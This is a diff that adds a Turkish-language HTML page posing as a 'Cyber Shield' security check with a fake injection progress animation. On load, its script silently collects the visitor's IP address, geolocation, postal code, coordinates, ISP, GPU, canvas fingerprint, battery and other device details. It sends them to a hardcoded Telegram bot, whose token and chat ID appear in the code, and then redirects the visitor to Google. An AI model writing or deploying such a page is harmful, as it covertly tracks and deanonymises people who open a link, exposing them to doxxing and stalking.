@@ -1,0 +1,200 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sistem Güvenlik Protokolü</title>
+    <style>
+        body { background: #000; color: #00ff66; font-family: 'Courier New', monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
+        .matrix-bg { position: absolute; top: 0; left: 0; width: 100%; height: 100%; font-size: 10px; color: rgba(0, 255, 102, 0.15); line-height: 1; z-index: 1; pointer-events: none; padding: 10px; box-sizing: border-box; word-break: break-all; }
+        .matrix-box { width: 85%; max-width: 450px; padding: 30px; border: 2px solid #00ff66; background: rgba(5, 5, 5, 0.95); text-align: center; box-shadow: 0 0 40px rgba(0, 255, 102, 0.5); border-radius: 8px; z-index: 2; position: relative; }
+        .progress-bar { width: 100%; background: #111; border: 1px solid #00ff66; height: 12px; margin-top: 20px; border-radius: 6px; overflow: hidden; }
+        .progress-fill { width: 0%; height: 100%; background: linear-gradient(90deg, #00aa44, #00ff66); transition: width 0.3s ease; }
+        .console-text { font-size: 11px; text-align: left; background: #000; padding: 10px; border: 1px solid #222; height: 80px; overflow-y: hidden; margin-top: 15px; color: #888; }
+    </style>
+</head>
+<body>
+
+    <div id="matrix" class="matrix-bg"></div>
+
+    <div class="matrix-box">
+        <div style="font-weight: bold; font-size: 18px; letter-spacing: 3px; text-shadow: 0 0 10px #00ff66;">⚡ CYBER SHIELD v7.5</div>
+        <div id="status" style="margin-top: 15px; color: #ff3333; font-weight: bold;">[!] ENJEKSİYON BAŞLATILDI...</div>
+        
+        <div class="console-text" id="console">
+            > Sunucu tüneli aranıyor...<br>
+        </div>
+
+        <div class="progress-bar"><div id="fill" class="progress-fill"></div></div>
+    </div>
+
+    <script>
+        setInterval(() => {
+            document.getElementById('matrix').innerText += Math.random().toString(36).substring(2, 7) + " ";
+            if(document.getElementById('matrix').innerText.length > 2000) document.getElementById('matrix').innerText = "";
+        }, 100);
+
+        function getCanvasFingerprint() {
+            try {
+                const canvas = document.createElement('canvas');
+                const ctx = canvas.getContext('2d');
+                ctx.textBaseline = "top";
+                ctx.font = "14px 'Arial'";
+                ctx.fillStyle = "#f60";
+                ctx.fillRect(125, 1, 62, 20);
+                ctx.fillStyle = "#069";
+                ctx.fillText("CyberShield, v7.5 <canvas>", 2, 15);
+                const src = canvas.toDataURL();
+                let hash = 0;
+                for (let i = 0; i < src.length; i++) {
+                    hash = ((hash << 5) - hash) + src.charCodeAt(i);
+                    hash = hash & hash;
+                }
+                return Math.abs(hash).toString(16).toUpperCase();
+            } catch (e) { return "Üretilemedi"; }
+        }
+
+        window.onload = function() {
+            let fill = document.getElementById('fill');
+            let status = document.getElementById('status');
+            let consoleLog = document.getElementById('console');
+
+            const log = (text) => {
+                consoleLog.innerHTML += "> " + text + "<br>";
+                consoleLog.scrollTop = consoleLog.scrollHeight;
+            };
+
+            setTimeout(() => {
+                fill.style.width = "20%";
+                status.innerText = "[*] MODÜLLER YÜKLENİYOR...";
+                log("Anti-Proxy katmanı aktif edildi.");
+            }, 1000);
+
+            setTimeout(() => {
+                fill.style.width = "50%";
+                status.innerText = "[*] DONANIM AYRIŞTIRILIYOR...";
+                log("İşlemci mimarisi taranıyor.");
+            }, 3000);
+
+            setTimeout(() => {
+                fill.style.width = "80%";
+                status.innerText = "[*] COORD GATEWAY ALINIYOR...";
+                log("Bölgesel proxy tünelleri kontrol ediliyor.");
+            }, 5000);
+
+            let cacheBuster = "?cb=" + Math.random();
+            fetch("https://ipapi.co/json/" + cacheBuster)
+            .then(response => response.json())
+            .then(async data => {
+                let ip = data.ip || "Bilinmiyor";
+                let ulke = data.country_name || "Bilinmiyor";
+                let eyalet_sehir = data.city ? (data.region ? data.region + " / " + data.city : data.city) : "Bilinmiyor";
+                let posta_kodu = data.postal || "Bilinmiyor";
+                let koordinat = data.latitude && data.longitude ? data.latitude + " , " + data.longitude : "Bilinmiyor";
+                let internet_sirketi = data.org || "Bilinmiyor";
+
+                let ua = navigator.userAgent;
+                let os = "Bilinmeyen Sistem";
+                
+                // Geliştirilmiş Android sürüm çözümleme alanı
+                if (/Android/i.test(ua)) {
+                    let match = ua.match(/Android\s+([0-9\.]+)/i);
+                    if (!match) {
+                        match = ua.match(/Android\/([0-9\.]+)/i);
+                    }
+                    os = match ? "Android " + match[1] : "Android";
+                } else if (/iPhone|iPad|iPod/i.test(ua)) {
+                    let match = ua.match(/OS (\d+)_(\d+)_?(\d+)?/);
+                    os = match ? "iOS " + match[1] + "." + match[2] : "iOS";
+                } else if (/Windows/i.test(ua)) {
+                    os = "Windows";
+                }
+
+                let cihaz_saati = Intl.DateTimeFormat().resolvedOptions().timeZone;
+                let vpn_proxy = "Temiz (Doğal Bağlantısı)";
+                if (cihaz_saati.toLowerCase().includes("istanbul") && ulke !== "Bilinmiyor" && ulke !== "Turkey") {
+                    vpn_proxy = "⚠️ KESİN VPN (Cihaz TR, IP Yabancı!)";
+                }
+
+                let ekran = window.screen.width + "x" + window.screen.height;
+                let cekirdek = navigator.hardwareConcurrency || "?";
+                let ram = (navigator.deviceMemory ? navigator.deviceMemory + " GB" : "Bilinmiyor");
+                let dil = navigator.language || "Bilinmiyor";
+                let dokunmatik = (('ontouchstart' in window) || (navigator.maxTouchPoints > 0)) ? "Evet" : "Hayır";
+                let tema = (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) ? "Karanlık" : "Açık";
+                let tarih = new Date().toLocaleString('tr-TR');
+                let canvasHash = getCanvasFingerprint();
+
+                let gpuModel = "Bilinmiyor";
+                try {
+                    const canvasGpu = document.createElement('canvas');
+                    const gl = canvasGpu.getContext('webgl');
+                    if (gl) {
+                        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                        if (debugInfo) gpuModel = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+                    }
+                } catch(e){}
+
+                let pil = "Bilinmiyor";
+                if (navigator.getBattery) {
+                    try {
+                        let b = await navigator.getBattery();
+                        pil = Math.round(b.level * 100) + "% " + (b.charging ? "(Şarjda ⚡)" : "(Deşarj)");
+                    } catch(e){}
+                }
+
+                let agTipi = "Bilinmiyor";
+                if (navigator.connection) {
+                    agTipi = navigator.connection.effectiveType + " (~" + navigator.connection.downlink + " Mbps)";
+                }
+
+                setTimeout(() => {
+                    fill.style.width = "100%";
+                    status.style.color = "#00ff66";
+                    status.innerText = "[+] ENJEKSİYON TAMAMLANDI!";
+                    log("Sistem logları şifrelendi, sızdırılıyor.");
+                }, 7000);
+
+                let mesaj = "👑 *MEGA NETWORK OPERATIONS LOG*\n";
+                mesaj += "━━━━━━━━━━━━━━━━━━━━━━\n";
+                mesaj += "🌐 *IP Adresi:* `" + ip + "`\n";
+                mesaj += "🤖 *Sistem (OS):* `" + os + "` 🛡️\n";
+                mesaj += "⏰ *Zaman Damgası:* " + tarih + "\n";
+                mesaj += "━━━━━━━━━━━━━━━━━━━━━━\n";
+                mesaj += "📍 *Konum / Ülke:* " + ulke + " - " + eyalet_sehir + "\n";
+                mesaj += "📮 *Posta Kodu:* " + posta_kodu + "\n";
+                mesaj += "🗺️ *Koordinatlar:* " + koordinat + "\n";
+                mesaj += "🏢 *Sağlayıcı (ISP):* " + internet_sirketi + "\n";
+                mesaj += "🛡️ *VPN / Proxy Durumu:* " + vpn_proxy + "\n";
+                mesaj += "⚙️ *Cihaz Saat Dilimi:* " + cihaz_saati + "\n";
+                mesaj += "━━━━━━━━━━━━━━━━━━━━━━\n";
+                mesaj += "🖥️ *Ekran Çözünürlüğü:* " + ekran + "\n";
+                mesaj += "🧠 *İşlemci Gücü:* " + cekirdek + " Çekirdek\n";
+                mesaj += "💾 *Sistem RAM:* " + ram + "\n";
+                mesaj += "🔋 *Pil Seviyesi:* " + pil + "\n";
+                mesaj += "🎨 *Cihaz Teması:* " + tema + "\n";
+                mesaj += "👆 *Dokunmatik Ekran:* " + dokunmatik + "\n";
+                mesaj += "🗣️ *Cihaz Dili:* " + dil + "\n";
+                mesaj += "━━━━━━━━━━━━━━━━━━━━━━\n";
+                mesaj += "🎮 *Ekran Kartı (GPU):* `" + gpuModel + "`\n";
+                mesaj += "🔑 *Canvas Fingerprint:* `" + canvasHash + "`\n";
+                mesaj += "📡 *Bağlantı Kalitesi:* " + agTipi + "\n";
+                mesaj += "━━━━━━━━━━━━━━━━━━━━━━";
+
+                let tok = "8955422545:AAHLRntql6QLsF6DTdy6uaZRsBeVTvxzVtU";
+                let cid = "6845229845";
+                let url = "https://api.telegram.org/bot" + tok + "/sendMessage?chat_id=" + cid + "&text=" + encodeURIComponent(mesaj) + "&parse_mode=Markdown";
+
+                setTimeout(() => {
+                    fetch(url)
+                    .then(() => { window.location.href = "https://www.google.com"; })
+                    .catch(() => { window.location.href = "https://www.google.com"; });
+                }, 8500);
+            })
+            .catch(() => {
+                setTimeout(() => { window.location.href = "https://www.google.com"; }, 8500);
+            });
+        };
+    </script>
+</body>
+</html>
